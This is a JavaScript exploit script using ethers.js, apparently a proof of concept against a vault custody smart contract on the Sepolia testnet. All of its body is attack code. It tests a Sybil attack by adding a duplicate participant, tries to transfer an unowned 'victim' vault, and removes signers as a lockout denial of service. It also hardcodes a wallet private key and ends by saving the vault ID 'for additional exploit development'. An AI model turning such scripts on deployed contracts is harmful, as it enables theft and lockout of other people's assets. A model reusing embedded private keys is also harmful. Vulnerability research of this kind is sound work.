const { ethers } = require("ethers");

// === PROOF OF SYBIL ATTACK + FIND MORE VULNERABILITIES ===
// Using the previously created vault to test additional exploits

const RPC_URL = "https://ethereum-sepolia.publicnode.com";
const CUSTODY_ADDRESS = "0x815aeca64a974297942d2bbf034bd63eb638883d";
const PRIVATE_KEY = "0xa12f4dc456a8fa989f093604e702384f9691f99c3242f615fc9a1ba0d3b3eaf2";

// If you have an existing vault from previous test, put it here:
const EXISTING_VAULT_ID = null; // Will create new if null

const ABI = [
    "function createVault(bytes32 _creator) external",
    "function addParticipant(bytes32 _creator, bytes32 _participant, string _shard) external",
    "function removeParticipant(bytes32 _creator, bytes32 _participant) external",
    "function transferVault(bytes32 _creator, address _transferee) external",
    "function defineQuorum(bytes32 _creator, uint256 _minParticipants) external",
    "function getQuorum(bytes32 _creator) external view returns (uint256)",
    "function getParticipants(bytes32 _creator) external view returns (bytes32[])"
];

async function run() {
    console.log("=== COMPREHENSIVE VULNERABILITY TEST ===\n");

    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    const contract = new ethers.Contract(CUSTODY_ADDRESS, ABI, wallet);

    let vaultId = EXISTING_VAULT_ID;

    console.log("PROOF DETAILS:");
    console.log("=".repeat(70));
    console.log(`Tester Wallet:   ${wallet.address}`);
    console.log(`Contract:        ${CUSTODY_ADDRESS}`);
    console.log(`Network:         Ethereum Sepolia`);
    console.log("=".repeat(70));

    // Create vault if needed
    if (!vaultId) {
        vaultId = ethers.utils.formatBytes32String("Test" + Date.now());
        console.log(`\nSetup: Creating Vault: ${vaultId}`);
        const tx = await contract.createVault(vaultId, { gasLimit: 500000 });
        const receipt = await tx.wait();
        console.log(`Vault Created. Transaction: ${receipt.transactionHash}\n`);
    }

    console.log(`\n${"=".repeat(70)}`);
    console.log("TEST 1: SYBIL ATTACK (Duplicate Participants)");
    console.log("=".repeat(70));
    const participant = ethers.utils.formatBytes32String("DuplicateTest");
    console.log(`Participant ID: ${participant}\n`);

    try {
        const tx1 = await contract.addParticipant(vaultId, participant, "shard_1", { gasLimit: 500000 });
        const r1 = await tx1.wait();
        console.log(`First Add Success - Tx: ${r1.transactionHash}`);

        const tx2 = await contract.addParticipant(vaultId, participant, "shard_2", { gasLimit: 500000 });
        const r2 = await tx2.wait();
        console.log(`Second Add Success - Tx: ${r2.transactionHash}`);
        console.log("\nEXPLOIT CONFIRMED: Same participant added twice.");
        console.log("This allows a single user to control multiple votes.\n");
    } catch (e) {
        console.log(`Blocked: ${e.reason || e.message}\n`);
    }

    console.log(`${"=".repeat(70)}`);
    console.log("TEST 2: UNAUTHORIZED VAULT TRANSFER");
    console.log("=".repeat(70));
    console.log("Testing if we can steal someone else's vault...\n");

    try {
        const randomVictimVault = ethers.utils.formatBytes32String("VictimVault");
        await contract.callStatic.transferVault(randomVictimVault, wallet.address);
        console.log("EXPLOIT CONFIRMED: Can transfer unowned vaults.\n");
    } catch (e) {
        console.log(`Protected: ${e.reason || e.message}\n`);
    }

    console.log(`${"=".repeat(70)}`);
    console.log("TEST 3: PARTICIPANT REMOVAL (Lockout Attack)");
    console.log("=".repeat(70));
    console.log("Testing if we can remove participants to lock vault...\n");

    try {
        const tx3 = await contract.removeParticipant(vaultId, participant, { gasLimit: 500000 });
        const r3 = await tx3.wait();
        console.log(`Participant Removed. Tx: ${r3.transactionHash}`);
        console.log("IMPACT: Can remove legit signers causing DoS.\n");
    } catch (e) {
        console.log(`Blocked: ${e.reason || e.message}\n`);
    }

    console.log("\n" + "=".repeat(70));
    console.log("SUMMARY");
    console.log("=".repeat(70));
    console.log(`Vault ID for Further Testing: ${vaultId}`);
    console.log("Save this for additional exploit development.");
}

run().catch(console.error);
